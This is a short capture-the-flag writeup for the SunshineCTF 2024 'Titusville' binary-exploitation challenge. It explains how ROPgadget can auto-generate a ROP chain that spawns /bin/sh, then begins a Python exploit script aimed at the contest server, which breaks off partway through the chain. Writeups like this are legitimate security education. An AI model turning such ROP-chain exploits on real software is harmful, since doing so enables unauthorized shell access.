---
title: "Titusville - SunshineCTF 2024"
category: "pwn"
subcategory: "rop"
type: "writeup"
tags: ["pwn", "ropchain", "rop", "aslr", "gef", "titusville", "sunshinectf", "sunshinectf-2024", "2024", "ctf-writeup"]
summary: "The attachment is a binary without ASLR with statically-linked libc."
source:
  name: "CTFtime writeup #39576"
  url: "https://ctftime.org/writeup/39576"
original_source: "https://github.com/ksaweryr/ctf-writeups/blob/master/2024/sunshinectf/Titusville/README.md"
ctf:
  name: "SunshineCTF 2024"
  year: 2024
  challenge: "Titusville"
---

## Metadata

- **CTF:** SunshineCTF 2024
- **Task:** Titusville
- **Author team:** TU Delft CTF Team
- **CTFtime tags:** ropchain, rop
- **CTFtime:** <https://ctftime.org/writeup/39576>
- **Original writeup:** <https://github.com/ksaweryr/ctf-writeups/blob/master/2024/sunshinectf/Titusville/README.md>

---
# Titusville  
> ### Category: I-95  
>  
> Maybe just go the other way at the exit and go to Orlando instead :D  
>  
> `nc 2024.sunshinectf.games 24607`  
>  
> ### Attachments  
> `titusville`

## Solution  
The attachment is a binary without ASLR with statically-linked libc. It is however missing functions like `system` or `execve`. An easy way to solve it is to run `$ ROPgadget --binary titusville --ropchain` to generate a ROP chain that uses a syscall to execute /bin/sh.

## Script  
```py  
from gdb_plus import *  
from struct import pack

FILENAME = './titusville'  
PORT = 24607

e = ELF(FILENAME)

dbg = Debugger(FILENAME, script='init-gef').remote('2024.sunshinectf.games', PORT)

io = dbg.p

dbg.c(wait=False)

# ROPgadget --binary titusville --ropchain  
p = b''  
p += pack('
